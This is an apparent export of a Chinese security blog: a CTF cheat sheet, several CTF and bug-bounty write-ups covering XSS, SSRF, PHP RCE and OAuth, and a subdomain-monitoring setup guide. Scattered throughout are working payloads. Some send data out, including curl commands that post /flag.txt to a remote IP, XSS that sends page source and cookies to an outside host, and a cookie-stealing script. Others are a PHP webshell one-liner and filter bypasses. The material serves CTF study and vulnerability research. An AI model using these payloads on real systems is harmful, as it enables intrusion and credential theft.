[{"title":"置顶-持续更新中的CTF备忘录","date":"2024-12-31T16:00:00.000Z","path":"2025/01/01/CTF比赛常用-持续更新/","text":"CTF比赛常用-持续更新反序列化常识 在反序列化的时候，不会执行__construct里的值 原类中无法控制的private/protected变量，可以自己用构造方法序列化进去 找到反序列化的入口很关键 常见魔法函数https://www.anquanke.com/post/id/159206 XSS常识dom结构取url中”#”后面的字符串 document.location.hash.substr(1)编码&amp;#106=&amp;#0000106 有没有’;’都一样，都是html编码。106是ascii编码值，默认编码格式占7位 各种协议datadata:text/html 适用于src属性后面，能解析js语句的函数(例如eval,setTimeout) data:text/html;base64,xxxx注意点：1、xxx即恶意payload的base64编码，用console的btoa来编码payload，不要用其它的base64编码 2、还有一种冷门的用法，执行点在charset，前提是需要定义window.text、window.html、window.base64 eval(&#39;data:text/html;charset=alert(1);base64,whatever&#39;)这个用法的例子见:https://dee-see.github.io/intigriti/xss/2019/05/02/intigriti-xss-challenge-writeup.html 打页面源码&lt;svg/onload=&quot;document.location=&#39;http://ugelgr.ceye.io/?&#39;+btoa(document.body.innerHTML)&quot;&gt;JS发送xml请求xmlhttp=new XMLHttpRequest(); xmlhttp.onreadystatechange=function() { if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200) { document.location=&#39;http://vps_ip:23333/?&#39;+btoa(xmlhttp.responseText); } } xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true); xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;); xmlhttp.send(&quot;url=xxx&quot;);跨域可以看总结：https://xz.aliyun.com/t/5084 iframe当一个同源站点，同时存在两个页面，其中一个有CSP保护的A页面，另一个没有CSP保护B页面。 那么如果B页面存在XSS漏洞，我们可以直接在B页面新建iframe用javascript直接操作A页面的dom，A页面的CSP防护完全失效 SSRF各种绕过姿势在笔记里有 过滤指定字符串用unicode编码绕过localhost的限定 LocalHost = localhost = ⓛocaⓛhost IP地址转换绕过数字地址(十进制)：127.0.0.1-&gt;2130706433十六进制：127.0.0.1-&gt;0x7F000001或0x7F.00.00.01或0x7F.0x00.0x00.0x01八进制： 127.0.0.1-&gt;0177.0.0.1或0177.00.00.01省略写法：127.0.0.1-&gt;127.1 在吐司学的一招：如果302跳转(准确的说是http协议)禁用IPV4的规则传入，可以用IPV6绕过： http://[::ffff:127.0.0.1]/ 也可以缩写成 http://[::1]/check内网ip段绕过php过滤代码如下 $hostname=$url_parse[&#39;host&#39;]; $ip=gethostbyname($hostname); $int_ip=ip2long($ip); return ip2long(&#39;127.0.0.0&#39;)&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long(&#39;10.0.0.0&#39;)&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long(&#39;172.16.0.0&#39;)&gt;&gt;20 == $int_ip&gt;&gt;20 || ip2long(&#39;192.168.0.0&#39;)&gt;&gt;16 == $int_ip&gt;&gt;16; 用ip2long和parse_url来check请求是否包含内网ip段，则可以用以下方法绕过 1. http://0.0.0.0/flag.php 2. http://foo@127.0.0.1:80@baidu.com/flag.php 3. http://%5B::%5D:22/第一种是0.0.0.0掩码绕过第二种白名单是baidu.com，黑名单是127x网段第三种是绕过主机名探测，用[::]替代127.0.0.1 xip.io绕过127.0.0.1.xip.iowww.127.0.0.1.xip.ioxxx.127.0.0.1.xip.iofuzz.xxx.127.0.0.1.xip.io file协议妙用我们可以通过 file:///proc/self/cwd/index.php 获得index.php文件。在linux中，每个进程都有一个PID，而/proc/xxx/下存放着与该进程相关的信息（这里的xxx就是PID）。/proc/xxx/下的cwd是软链接，self表示本进程。当我们通过访问Apache运行的网站时，/proc/self/cwd/就相当于apache的根目录，例如我本机Apache的根目录是/var/www/html SQL注入sql语句查询mysql操作日志:http://www.cnblogs.com/jhin-wxy/p/8965888.html XXE利用利用报错和外带ood来读取本地文件 利用本地xxe来bypass协议不回显的情况https://xz.aliyun.com/t/5503 https://www.jishuwen.com/d/2EGU 文件上传大致思路1、改content-type? 2、是否存在解析漏洞 .php.xxx 3、是否可以上传其它能解析的后缀？ 4、存在二次渲染漏洞？imagecreatfrompng 5、apache2.4是否存在0a换行绕过？ 6、htaccess是否可以上传？妙用.htaccessapache中的.htaccess 将同目录下的jpg解析为php,文件内容如下 AddType application/x-httpd-php .jpg文件包含php伪协议 php://input php://filter file=php://filter/read=convert.base64-encode/resource=index.php phar:// 命令执行类常识获取flag文件并用Curl协议外带到自己的vps curl &#39;http://50.16.48.95/&#39; data &quot;`cat+/flag.txt`&quot;curl -T ./flag.txt http://50.16.48.95/命令执行Bypass过滤关键字ca\\t /f\\lag双引号&amp;分号–复杂变量PHP复杂变量：https://xz.aliyun.com/t/4785 ${system(whoami)} 常见的过滤bypassphp一句话绕过&lt;?限制的一句话和php标签限制 &lt;script language=&quot;PHP&quot;&gt;system($_GET[id])&lt;/script&gt;动态执行函数 1、没有过滤括号 $_GET[1]($_GET[0]); 2、过滤了括号的时候可以用大括号，但是php版本有要求，不过phpstudy没试出来 $_GET{1}($_GET{0});"},{"title":"前端全局变量劫持","date":"2019-07-01T16:00:00.000Z","path":"2019/07/02/前端全局变量劫持/","text":"前端全局变量劫持最近看了wonderkun师傅的一篇文章，觉得还挺有意思的，收获颇丰。决定自己复现研究一下，原文地址：前端中存在的变量劫持漏洞 先说一下鸡肋的点，这个变量的劫持也只能是把变量劫持为正常页面的window对象，并不能随意修改变量的值 子页面获取首先kun师傅介绍了三种父页面获取子页面windows对象的方式: document.getElementById(&quot;iframe1&quot;).contentWindow; window.frames[0]; window[0] ;id值是一个全局变量，下例中test这个”id值”就代表iframe标签。也可以通过直接调用iframe内的name属性值获取该iframe的window对象 利用filter模式删除变量无论是javascript还是调用标签，都无法覆盖已经定义的变量，但是却可以定义新的变量。 怎么让页面中出现未定义的全局变量呢？kun师傅提到chrome74之后，默认的xss auditor 从block模式编程了filter模式，可以利用这个删除掉页面中的代码。也就是说我们用一段xss代码触发chrome xss auditor删除xss引用的变量，从而达到替我们删除正常变量的目的。 这里简单介绍一下xss auditor XSS-AuditorXSS-Auditor是chrome默认开启的，也可以选择在header中关闭Auditor X-XSS-Protection: 0它的检测机制如文档中的描述 XSS Auditor采用黑名单方法来识别请求参数中提供的危险字符和标签。它还将查询参数与内容进行匹配以识别注入点。如果查询参数无法与响应中的内容匹配，则不会触发Auditor。 不过文档也有提到，基于上下文的检测的局限性使Auditor无法预防一些针对应用层的payload，这里不做深究。 删除变量demo&lt;script&gt;var hpdoger = &quot;remove me&quot;;&lt;/script&gt;当访问的参数以危险标签的形式出现在response中时，就会触发xss-auditor，成功删除自定义的hpdoger变量。下图可以看到变量被成功删除 http://localhost/iframe.html?xss=%3Cscript%3E%0A%20%20%20%20%20var%20hpdoger%20=%20%22remove%22;%0A%3C/script%3E bypass同源之iframe众所周知，用iframe去加载子页面会被同源限制(除非是cors配置的白名单) 如果儿子页面也存在iframe(划重点)，先通过操纵孙子c页面window对象来设置location，使其指向父页面a，这样父页面a和子页面b就同源了。之后再修改孙子页面c中window对象的name，其作用结果是：name作用域在子页面b的全局变量。 漏洞场景这里不重复造轮子了，引用kun师傅的文章：https://xz.aliyun.com/t/5565#toc-4 孙子页面c任意的页面 子页面b 父页面a第一步很关键的一点就是修改c页面的location指向a。之后a页面就可以调用b的变量，同时通过iframe触发b页面的xss auditor 第二步修改孙子页面c的name，从而帮b页面注册一个全局变量名为”hpdoger” 这样就成功替换掉b页面的hpdoger变量，同时a页面也可以访问b页面这个全局变量hpdoger(但是不能访问b的其他变量。因为我们通过c页面做跳板，只能访问c的属性间接访问到b的变量，我叫他”同名法则”)。不过前文也提到了这个鸡肋的地方，就是一个变量替换成window对象，受用面很有限。。"},{"title":"2019国赛Web线上题目Lovemath多解WP","date":"2019-04-22T16:00:00.000Z","path":"2019/04/23/2019国赛Web线上题目Lovemath多解WP/","text":"2019国赛Web线上题目Lovemath多解WP题目质量很不错，这题整整做了七个小时，从一开始想着拿一血到后来的自闭。 题目代码&lt;?php error_reporting(0); //听说你很喜欢数学，不知道你是否爱它胜过爱flag if(!isset($_GET[&#39;c&#39;])){ show_source(__FILE__); }else{ //例子 c=20-1 $content = $_GET[&#39;c&#39;]; if (strlen($content) &gt;= 80) { die(&quot;太长了不会算&quot;); } $blacklist = [&#39; &#39;, &#39;\\t&#39;, &#39;\\r&#39;, &#39;\\n&#39;,&#39;\\&#39;&#39;, &#39;&quot;&#39;, &#39;`&#39;, &#39;\\[&#39;, &#39;\\]&#39;]; foreach ($blacklist as $blackitem) { if (preg_match(&#39;/&#39; . $blackitem . &#39;/m&#39;, $content)) { die(&quot;请不要输入奇奇怪怪的字符&quot;); } } //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;]; preg_match_all(&#39;/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/&#39;, $content, $used_funcs); foreach ($used_funcs[0] as $func) { if (!in_array($func, $whitelist)) { die(&quot;请不要输入奇奇怪怪的函数&quot;); } } //帮你算出答案 eval(&#39;echo &#39;.$content.&#39;;&#39;); } 解题思路代码有一个黑名单blacklist&amp;白名单whitelist。黑名单肯定是绕不过去，虽然正则给了/m模式的情况下可以采用换行绕过，但是\\r也在封杀范围所以直接pass。注意看whitelist后面的逻辑：正则匹配所有字母，用foreach逐个比对匹配的字母。 也就是说只允许Eval使用白名单的函数做字符串 所以思路就很明确，既然参数从白名单出来后被执行，那漏洞点肯定就在白名单的函数。由于正则匹配字母的规则，使我们传入的实参不能是字母，否则就会进入判断如下 想办法把数字变成字母，再通过eval进行RCE。着眼于函数base_convert，官方描述如下 它允许我们将10进制数转换为最高36进制，结果为字符串。完美解决了数字到字母的转化，成功打印phpinfo如下 POC-1因为字符串长度限制，我最开始的想法是这样的： $input = hexdec(bin2hex(&quot;system(&#39;cat /flag&#39;);&quot;)) $result = base_convert(10进制编码字符串hex2bin,10,36)(dechex($input))完整转换是这样： base_convert(37907361743,10,36)(dechex(9148825951463535960001056079872))但是由于bin2hex后转换出来的16进制数值过大，导致hexdec转换的int值很大无法正常被dechex还原而溢出。在赛后看到一种payload，很聪明的避免了大数溢出的情况，如下 base_convert(47138,20,36)(base_convert(3761671484,13,36)(dechex(474260465194))) 正好79个字母堪称完美…解码后的调用栈如下 POC-2这个是看到ROIS队伍师傅的poc $pi=base_convert;$pi(371235972282,10,28)(($pi(8768397090111664438,10,30))(){9})解码出来是system(getallheaders(){9}) 也是很聪明的解法。变量赋值pi减少长度，用getallheaders动态传入参数，之前在code puzzle中见过这样的用法 POC-3这种就是比赛时我的解法。一种小数还原的思路。我们只需要构造_GET为16进制数，这个16进制转换出来的十进制就不会很大，自然在dechex也不会溢出。Payload如下，注意用白名单的值作为变量参数，否则还是会被waf $pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){0}(($$p){1})转换的调用栈如下： 直接发包给到C参数，成功getflag。"},{"title":"西湖论剑2019-Writeup","date":"2019-04-07T16:00:00.000Z","path":"2019/04/08/西湖论剑2019-Writeup/","text":"西湖论剑2019-WriteupAuthor:Hpdoger@D0g3 这次比赛的Web题顺序放的很有意思。先放web3、再web2、接着web1来了个bug题被秒。ak了三个web之后本来都出去买奶茶喝了，结果比赛末尾有师傅说上了个web4…好在最后零解23333 Web-3扫描到DS_Store文件泄露：http://ctf3.linkedbyx.com/11182/DS_Store 扫描了一下e1xxx这个自路径发现一处git泄露： 访问到github仓库:https://github.com/cumtxujiabin/zip 源码git clone下来看，发现Backup这个zip包需要密码，但是同文件夹下有Index.php和jpg被解压出来了。猜测是已知明文攻击 用AR跑了一下得到hint文件 点开hint有两个提示， 很明显这个code就是之前首页的参数值 seed应该暗示着随机数/种子 拿着Code请求得到一个数，结合hint猜测是要用兑换码爆破随机数种子 最后跑出来种子+.txt后缀请求得到flag 略脑洞。。 Web-2题目环境关了有些无法截图 随便输入账号都能登陆，有留言功能、提交给管理员url的功能和EXEC页面，EXEC我推测是个命令执行但是需要管理员权限，所以应该是XSS-&gt;admin-&gt;rce。留言位置可以插入标签iframe\\img\\svg.. 但是过滤掉了等号，会被转译成:)，我测试的时候用iframe以base64编码属性就能绕过 &lt;iframe/src=&quot;data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==编码内容即&lt;img src=x onerror=alert(1)&gt;，可以弹出对话框， 看到了提交Url处有这么一句话，大致好像是这么说的：管理员会拿着你的token来请求页面，之前还在想管理员怎么请求到我的main(因为我测试可以缓存js文件，可能也是一个方面)，但是看到这里就完全不用担心了，直接X一个储值型的标签打COOKIE 但是测试用js uri加载外源js不能成功，打不到cookie。 那么我们可不可以直接src下调用Javascript伪协议执行一段js发送COOKIE到平台呢？用ascii编码html字符去bypass 编码转换+exp如下 url编码处理一下&amp;、#字符 在平台打到cookie，发现存在admin字段 带着admin字段去exec.php执行命令就行了 curl+&#39;http://50.16.48.95/&#39;+--data+&quot;`cat+/flag.txt`&quot; 编码转换的exp如下 # Author:Hpdoger@d0g3 html_old = &quot;javascript:var website=&#39;http://xssye/index.php&#39;;(function(){(new Image()).src=website+&#39;/?keepsession=1&amp;location=&#39;+escape((function(){try{return document.location.href}catch(e){return&#39;&#39;}})())+&#39;&amp;toplocation=&#39;+escape((function(){try{return top.location.href}catch(e){return&#39;&#39;}})())+&#39;&amp;cookie=&#39;+escape((function(){try{return document.cookie}catch(e){return&#39;&#39;}})())+&#39;&amp;opener=&#39;+escape((function(){try{return(window.opener&amp;&amp;window.opener.location.href)?window.opener.location.href:&#39;&#39;}catch(e){return&#39;&#39;}})());})();&quot; buffer = &quot;&quot; for zimu in html_old: zimu = ord(zimu) zimu = &quot;&amp;#&quot;+(&quot;%07d&quot;) % (zimu) # print(&quot;&amp;#&quot;+zimu) buffer = buffer + zimu print(buffer)web-1这题上来就有个提示$_GET[‘file’]，打了下etc/passwd有内容 看到有个提示，base64解码之后是，dir.php 请求dir.php，同时fuzz参数，有个dir(其实略脑洞，我只尝试了file、dir、path就出来了。。 看到根目录存在ffxxx的文件，直接用file去读 MISC3 TTL隐写给了个本文，里面是很多TTL值。hint说隐藏了信息。 在网上找了一下，发现在MISC中有一项技术叫TTL隐写。 大致的隐写流程如下：将TTL的值转为8位二进制，高位补0，取头两位的二进制。这样4个TTL的值就能取够一个8位的二进制数，再将这个8位的二进制转换为字符(因为一个字符=一个字节=8位二进制)。 这就是成功将字符隐写在TTL值中，所以只需要逆出来取8位还原成字符就行，写了个提取脚本 #! /usr/bin/python3 # Author: Hpdoger@d0g3 count = 0 change_list = [] word_list = &#39;&#39; zimus = &#39;&#39; with open(&quot;ttls.txt&quot;,&quot;r&quot;) as file: for ttl in file.readlines(): change_list.append(ttl.replace(&#39;TTL=&#39;,&#39;&#39;)) if len(change_list) == 4: for num in change_list: num = int(num) a = bin(num).replace(&#39;0b&#39;,&#39;&#39;) b = str(&quot;%08d&quot; % int(a)) infront = b[0:2] word_list = word_list + infront zimu = int(word_list,2) zimus = zimus+chr(zimu) word_list = &#39;&#39; change_list.clear() count = 0 with open(&#39;results.txt&#39;,&#39;w&#39;) as file2: file2.write(zimus)转换出来的结果如下 一看就是16进制，开头ffd8ff是图片头，拖到winhex里还原成图片就行了，最后还原出来4个二维码。 拼接扫描得到: key:AutomaticKey cipher:fftu{2028mb39927wn1f96o6e12z03j58002p}维吉尼亚密码解密，得到flag{2028ab39927df1d96e6a12b03j58002v}再进行一次字母转换e-&gt;j,e-&gt;vflag{2028ab39927df1d96e6a12b03e58002e}"},{"title":"SRC挖掘初探之随缘XSS挖掘","date":"2019-04-04T16:00:00.000Z","path":"2019/04/05/SRC挖掘初探之随缘XSS挖掘/","text":"原文首发于先知社区：https://xz.aliyun.com/t/4625 Author:Hpdoger@D0g3 最近试着去学挖洞，在测某SRC的一些业务时发现以下几个XSS的点。对于一些请求参数在返回的html中以隐蔽的标签形式出现的XSS，感觉还是挺常见的。这里我写了个Bp的插件用来监听请求并捕获这种情况:SuperTags 下面的案例和讨论如果有什么片面或错误的地方，还望师傅们斧正 登陆跳转处XSS某处登陆页面看了眼表单，同时跟进事件绑定的对象utils 直接截出登陆验证部分，redata是响应参数，登陆成功为0。host定义为normal.com。这里发现其实在登陆的时候是可以存在一个cb参数的(但之前我登陆的时候并没有察觉，因为是后台有个功能loginout，点击才会附带cb参数到登录页) 其中,getparam方法如下 getParam: function(c_name) { var urlParams = location.href; var c_start = urlParams.indexOf(c_name + &quot;=&quot;);銆€ if (c_start != -1) { c_start = c_start + c_name.length + 1;銆€ c_end = urlParams.indexOf(&quot;&amp;&quot;, c_start); if (c_end == -1) { c_end = urlParams.length; } return urlParams.substring(c_start, c_end); }else{ return null; } },这里开发者还是对cb参数进行了意识形态的过滤，如果cb不包含host则强制重定向首页。但是略鸡肋，直接把host放在注释符后就能绕过。 POC： cb=javascript:alert(document.cookie);//normal.com Image处的XSS这是该厂商的一个移动端业务，在我测之前已经有表哥X进去了，看一下这个洞是如何产生的。 功能点:提交问题反馈，可以上传问题图片 漏洞逻辑：上传图片-&gt;提交反馈-&gt;服务端拼接提交的img参数(uri)为img标签src属性的完整地址 测试上传一个图片后，点击提交反馈并抓包，imglist参数是刚才上传图片返回的uri地址。 POST xxxx?q=index/feedback HTTP/1.1 imglist=%2Cpicture%2F2019%2F02%2F22%2F_a948b4eeaca7420cad9d54fdb0331230.jpg&amp;问题就出在拼接标签这部分，修改imglist参数就可以闭合Src属性进行xss,使最终的img标签执行onerror事件 步骤：抓包修改img路径-&gt;拼接恶意js事件，POC： imglist=urlencode(&quot; onerror=&quot;alert(`XSS�`)&quot;&gt; 成功弹窗 邮件提交处的XSS在测试某业务的邮箱密码验证时，发现一个包含请求邮箱的页面。 记得之前看过一篇文章，有些服务在发送完邮件后会弹出一个“邮件已发送+email”的页面导致反射型XSS，感觉就是这种了。 随手测试了一下，发现直接waf了空格、双引号、尖括号，和”&quot;。实体了html编码的尖括号，但是没有实体html编码的双引号。 同时在FUZZ的期间多次出现参数错误的请求，发现可能是应用层做了些过滤： email字符串长度&lt;40且@结尾 不能同时出现两个双引号、括号 正则alert(1)\\prompt(1)\\confim… 不过只要脱离引号就好说，毕竟有很多JS事件可以调。一开始把眼光放在了input标签上测试了一些on事件，发现type是hidden，一些可视on事件都没用的。记得之前看过一个input hidden xss的一个用法是按alt+shift+x触发，poc如下 urlencode(email=&amp;#34/accesskey=&amp;#34X&amp;#34/onclick=&amp;#34alert&amp;#40&#39;xss&#39;&amp;#41&amp;#34@qq.com) 但是这个poc很鸡肋。因为要打出cookie的话长度受限，且利用条件苛刻(firefox+按键) 回头看了下发现有form标签也有输出点，最初以为form能执行的JS事件就只有reset和submit，后来测试跑onmounseover也能弹框。 encodeurl(email=&amp;#34/onmouseover=&amp;#34alert&amp;#40document.cookie&amp;#41&amp;#34@qq.com) 一个受阻的XSS在测试某业务时发现一个有趣的参数拼接点： iframe的src拼接url参数+后端给定的第三方host-&gt;iframe加载src 测试了一下特殊字符都给实体化了，但是又舍不得一个iframe 经过一番寻找，发现第三方服务的登陆点存在JS跳转漏洞，用iframe加载这个第三方服务的dom-xss也能造成弹框效果 虽然是在SRC业务站点弹的框，但真正的域应该是子页面的。打印一下COOKIE验证，果然是子页面域的cookie。由于waf掉了document.cookie和javascript:alert，我用了html编码的’:’和八进制js编码的’.’绕过，完整打印子页面域payload如下 https://src.com?url=redirect_uri%3Djavascript%26%23x3A%3Bconsole.log(document\\56cookie)在进一步的探索中，我做了两个尝试： 尝试跳一个外域的JS，看能不能把src属性转到这个jshttps://src.com?url=redirect_uri%3Dhttps://evil.com/xss.js但是会把资源解析到子页面的document里，而不是src的改变 iframe是否能调用父页面的事件呢(document)？如果可以的话我们就直接调js uri把cookie打出去。之所以有这个想法是因为，当时寻思既然站点调用这个三方服务了，很大可能性这个三方站是iframe-src白名单。不过测试后发现依然被跨域限制，测试payloadhttps://src.com?url=redirect_uri%3Djavascript%26%23x3A%3Bconsole.log(window.parent.document\\56cookie) 对跨域姿势了解的不多，如果有兴趣的师傅，可以一起来交流一下这种问题 自闭总结从打ctf到学着去挖洞，还是有一些思维出入的地方，慢慢理解之前师傅们说的资产收集的重要性。 也特别感谢引路人鬼麦子师傅给予的帮助，这里顺便推荐麦子师傅基于爬虫的一款开源子域名监控工具get_domain，在搭建过程中如果遇到环境配置问题，可以参考这篇Ubuntu16.04-Get_domain搭建手册"},{"title":"Ubuntu16.04-子域名监控工具Getdomain环境搭建","date":"2019-03-29T16:00:00.000Z","path":"2019/03/30/Ubuntu16.04搭建子域名监控服务Get_domain/","text":"Ubuntu16.04-子域名监控Get_domain环境搭建操作环境：Ubuntu16.04数据库：Mongdb项目地址：https://github.com/guimaizi/get_domain 各种依赖安装sudo apt-get install git python3 python3-pip xvfb unzip libxss1 libappindicator1 libindicator7 -y sudo pip3 install selenium pymongo安装mongodb服务端 添加mongodb签名到APTsudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv EA312927 创建/etc/apt/sources.list.d/mongodb-org-3.2.list文件并写入命令echo &quot;deb http://repo.mongodb.org/apt/ubuntu xenial/mongodb-org/3.2 multiverse&quot; | sudo tee /etc/apt/sources.list.d/mongodb-org-3.2.list 更新软件源列表sudo apt-get update 安装mongodb（默认是安装稳定版）sudo apt-get install -y mongodb-org 配置mongodb服务端 修改配置文件/etc/mongodb.conf 修改后的内容如下： bind_ip = 0.0.0.0 port = 27017 auth=true (添加帐号,密码认证)修改后重启mongodb:sudo service mongodb restart 添加超级用户 use admin db.createUser({user:&#39;admin&#39;,pwd:&#39;123456aaa1xsda1A&#39;,roles:[{role:&#39;userAdminAnyDatabase&#39;,db:&#39;admin&#39;}]}) db.auth(&#39;admin&#39;,&#39;123456aaa1xsda1A&#39;) 添加扫描器用户 use target_domain db.createUser({user:&#39;target&#39;,pwd:&#39;123456aaaxsda1A&#39;,roles:[{role:&#39;readWrite&#39;,db:&#39;target_domain&#39;}]}) db.auth(&#39;target&#39;,&#39;123456aaaxsda1A&#39;) 安装chromedriver先安装Chrome浏览器 sudo apt-get install libxss1 libappindicator1 libindicator7 wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb sudo dpkg -i google-chrome*.deb sudo apt-get install -f再安装chromedriver wget -N http://chromedriver.storage.googleapis.com/72.0.3626.7/chromedriver_linux64.zip unzip chromedriver_linux64.zip chmod +x chromedriver sudo mv -f chromedriver /usr/local/share/chromedriver sudo ln -s /usr/local/share/chromedriver /usr/local/bin/chromedriver sudo ln -s /usr/local/share/chromedriver /usr/bin/chromedriver安装go-lang$ sudo apt-get update $ sudo apt-get -y upgrade $ wget https://storage.googleapis.com/golang/go1.7.linux-amd64.tar.gz $ sudo tar -xvf go1.7.linux-amd64.tar.gz $ sudo mv go /usr/local设置gopath vim /etc/profile export GOROOT=/usr/local/go #设置为go安装的路径，有些安装包会自动设置默认的goroot export GOPATH=$HOME/gocode #默认安装包的路径 export PATH=$PATH:$GOROOT/bin:$GOPATH/bin source /etc/profilego env看一下是否设置成功 设置Python默认为Python3文章：https://blog.csdn.net/u011534057/article/details/51615193 使用文章的第二种方法：在系统级修改 Python 版本 下载subfindergo get github.com/subfinder/subfinder报错没关系，只要文件里有bin src就行 后续步骤见http://www.guimaizi.com/archives/360的启动说明 crontab定时执行任务：https://www.jianshu.com/p/838db0269fd0 crontab文件如下，每天12点执行： # everday 12:00 am exec 0 0 17 * * ? python /home/get_domain/while_update.py 注意最后要留个空行 Mongodb操作更新，否则无法进行对比，更新状态到0 db.getCollection(&#39;xxx&#39;).update({&#39;state&#39;:1},{$set:{&#39;state&#39;: NumberInt(0)}},{multi:true}) 一直运行random_startnohup python -u random_start.py &gt; nohup.log 2&gt;&amp;1 &amp;记得修改random_start的代码为while 1可以修改五次config,运行五个后台程序 各种报错解决报错代码127selenium.common.exceptions.WebDriverException: Message: Service chromedriver unexpectedly exited. Status code was: 127原因是browser版本过低，跟driver不匹配，升级browser apt-get install chromium-browser权限报错selenium.common.exceptions.WebDriverException: Message: unknown error: Chrome failed to start: exited abnormallchromedriver在py程序里没权限，修改代码Browser.py chrome_options.add_argument(&#39;--headless&#39;) chrome_options.add_argument(&#39;--no-sandbox&#39;) 相关链接安装mongodb:https://www.jianshu.com/p/5598f1dcbb98"},{"title":"0CTF2019-Web1WriteUp","date":"2019-03-24T16:00:00.000Z","path":"2019/03/25/0CTF2019-Web1WriteUp/","text":"0CTF Web1第一次打0ctf，长见识了，各路神仙满天飞.. 题目地址：http://111.186.63.207:31337 需要一个karaf认证，直接双写karaf 当时组内师傅说有jolokia 去搜了一下jolokia的洞，看到了Lucifaer师傅的两篇分析文章https://lucifaer.com/2019/03/11/Attack%20Spring%20Boot%20Actuator%20via%20jolokia%20Part%201/#0x05-poc%E6%9E%84%E9%80%A0 https://lucifaer.com/2019/03/13/Attack%20Spring%20Boot%20Actuator%20via%20jolokia%20Part%202/#0x04-%E6%9E%84%E9%80%A0poc 大致意思就是，执行器可以调用jolokia的list里类的函数来执行一些操作。可是搜了一下List没有logback可以用，但是题目里很明显提示有karaf，那么是否可以通过控制器的poc安装一个karaf控制台呢？所有karaf的时候有下面这个op 最终POC，利用luciafaer师傅的post数据包改造，mbean+op+args 注意content-type:applicatio/json，bp直接发包太坑了"},{"title":"对“绕过Facebook Token进行CSRF账号接管”的文章解读","date":"2019-02-17T16:00:00.000Z","path":"2019/02/18/浅谈绕过Facebook Token进行CSRF账号接管/","text":"浅谈绕过Facebook Token进行CSRF账号接管今天早上看到Sam大佬推特发了这篇文章，下午就见到先知上有译文了。为什么有译文了还要写这篇文章呢？安全圈的译文你懂的，大部分右键一把梭。 从文章本身来说，还是有比较值得学习的地方，所以摘出来流程分析一下。 原文：https://ysamm.com/?p=185 先知译文: https://xz.aliyun.com/t/4089#toc-5 漏洞关键条件攻击者有一个oauth认证接口，即漏洞网站可以授权自己的网站 漏洞流程 第二步，即location的Url如下 https://www.facebook.com/comet/dialog_DONOTUSE/? url=/add_contactpoint/dialog/submit/%3fcontactpoint={EMAIL_CHOSEN}%26next= /v3.2/dialog/oauth%253fresponse_type%253dtoken%2526client_id%253d{ATTACKER_APP}%2526redirect_uri%253d{DOUBLE_URL_ENCODED_LINK]next参数为下一步跳转参数，即邮箱绑定后跳转到/v3.2/dialog/oauth%253fresponse_type%253dtoken%2526client_id%253d{ATTACKER_APP}%2526redirect_uri%253d{DOUBLE_URL_ENCODED_LINK]获取token再redirect到attacker web 总结/修复思考漏洞新颖的点就在授权后的跳转，这也算是一种突破oauth的新思路。利用信任站点的重定向进行其它oauth的绑定，再携带token二次重定向到attacker web。 如果能再二次重定向的地方加一个权限验证，即attacker app与oauth匹配，会不会避免这样的越权呢？ 其次就是，如果我们省略三方授权，直接诱导用户点击第二步的location，不就更省事了么？这点我邮寄了sam师傅，希望日后有其它研究的师傅可以指点一下~"},{"title":"Oauth2的两类漏洞挖掘","date":"2019-02-13T16:00:00.000Z","path":"2019/02/14/Oauth2的两类漏洞挖掘/","text":"Oauth2的两类漏洞挖掘一直忘了总结这个，结合OPPX的网站(无漏洞站点)说明一下 redict_uri限制不严格(Oauth配置错误)逻辑一般登陆选项是这样，常见的是QQ/微信/微博/…授权登陆 点击QQ授权的时候请求包和返回包如下 request: POST /oauth2.0/authorize HTTP/1.1 Host: graph.qq.com response_type=code&amp;client_id=100498628&amp;redirect_uri=https%3A%2F%2Fmy.oppo.com%2Fauth%2Fqqcallback&amp;scope=get_user_info%2Cadd_share%2Clist_album%2Cadd_album%2Cupload_pic%2Cadd_topic%2Cadd_one_blog%2Cadd_weibo%2Ccheck_page_fans%2Cadd_t%2Cadd_pic_t%2Cdel_t%2Cget_repost_list%2Cget_info%2Cget_other_info%2Cget_fanslist%2Cget_idolist%2Cadd_idol%2Cdel_idol%2Cget_tenpay_addr&amp;state=49085978f5e969063165246c6d07e062&amp;switch=&amp;from_ptlogin=1&amp;src=1&amp;update_auth=1&amp;openapi=80901010&amp;g_tk=1156350624&amp;auth_time=1550070856795&amp;ui=97557FF6-0331-4598-BC09-6CD21B7106E0response: HTTP/1.1 302 Moved Temporarily Server: nginx Date: Wed, 13 Feb 2019 15:17:13 GMT Content-Type: text/html Content-Length: 0 Connection: close Location: https://my.oppo.com/auth/qqcallback?code=5E0AA09C0CA8179C186688ABAF4BE043&amp;state=49085978f5e969063165246c6d07e062流程：请求graph.qq.com获得授权，拿到auth code后拼接到redirect_uri再请求，这点可以在返回包中的Location看到。 